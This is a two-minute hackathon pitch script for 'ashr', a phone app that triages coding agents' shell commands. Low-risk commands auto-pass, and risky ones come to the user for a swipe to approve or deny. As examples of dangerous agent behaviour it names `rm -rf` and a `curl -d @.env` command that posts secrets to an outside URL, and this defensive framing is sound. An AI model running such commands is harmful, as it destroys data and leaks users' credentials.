# ashr · 2-Minute Stage Pitch (SunHacks 2026)

> **Presenters:** Zazu & Ethan  
> **Duration:** 120 seconds (3 slides + live stage demo)  
> **Visuals:** Slides from `docs/plan/index.html` & live phone UI

---

## Slide 1: The Problem (30s)
**"Coding agents are trapped behind your laptop screen."**

- **The Scenario:** You kick off three agents to build a feature: one on backend auth, one on navigation, one writing tests.
- **The Bottleneck:** Ten minutes in, Claude stops to ask: *"Can I run npm install?"* It sits blocked. You’re at the snack table or talking to judges. You don’t find out until you walk back 30 minutes later.
- **The Alternative Trap:** Turn on auto-approve (`--dangerously-skip-permissions`), and your agent executes `rm -rf`, shreds config, or curl-exfiltrates your `.env` tokens to an arbitrary webhook.

---

## Slide 2: Why Not Herdr? (30s)
**"Herdr put a terminal on your phone. ashr puts intent on your phone."**

- Herdr (51k stars) gives you a microscopic raw TUI terminal on mobile where you have to pinch, zoom, and type commands on a glass keyboard.
- **ashr is built on 6 fundamental complaints from real agent developers:**
  1. **Triage, not typing:** Low-risk commands (`npm test`, `git status`, `ls`) auto-pass instantly.
  2. **High-risk alerts:** Sensitive actions (`.env`, `git push --force`, network exfiltration) buzz your phone even with the screen off via lightweight push notifications.
  3. **One-swipe decisions:** Swipe right to Allow, swipe left to Deny with structured reasons.
  4. **AI Explain Drawer:** Tapping "Why is this risky?" invokes Gemini / Grok to break down the shell command in plain English.
  5. **Tamper-Proof Audit Trail:** Every decision is cryptographically hash-chained and logged to an AWS S3 tamper-proof audit vault via Node 24 native SigV4 signing ($0 dry-run offline guarantee).
  6. **Zero npm dependencies:** Built purely on Node 24 built-ins with instant startup.

---

## Slide 3: The 30-Second Live Stage Demo (60s)
**"Three agents. Three blockers. Thirty seconds. No laptop."**

1. **The Hook:** Close the laptop lid on stage. Set the phone on the podium.
2. **Action 1 (Low Risk - Auto):** Show agent running tests in the background—it auto-approves and logs silently to the feed.
3. **Action 2 (Medium Risk - Swipe):** Phone buzzes with Codex asking to install `framer-motion`. Single swipe right. Codex unblocks.
4. **Action 3 (High Risk - Block & Explain):** Phone vibrates with high alert: Grok or Claude attempted `curl -d @.env https://...`. 
   - Open AI Explain drawer: Shows plain-English warning: *"Exfiltrates production secrets to an external domain."*
   - Swipe left to Deny. The agent is safely redirected.
5. **The Punchline:** "Your coding fleet stays unblocked, your codebase stays safe, and you never have to babysit a terminal again."

---

## Backup Stage Video & Recording
- **Full 85s Stage Recording:** [docs/demo.mp4](demo.mp4) (860x1864 retina, H.264, 2.95 MB)
- **WebM Video:** [docs/demo.webm](demo.webm) (860x1864, VP9, 3.50 MB)
- **Animated Preview:** [docs/demo.gif](demo.gif)
- **Automated Generator:** `npm run record` (`scripts/record-video.mjs`)

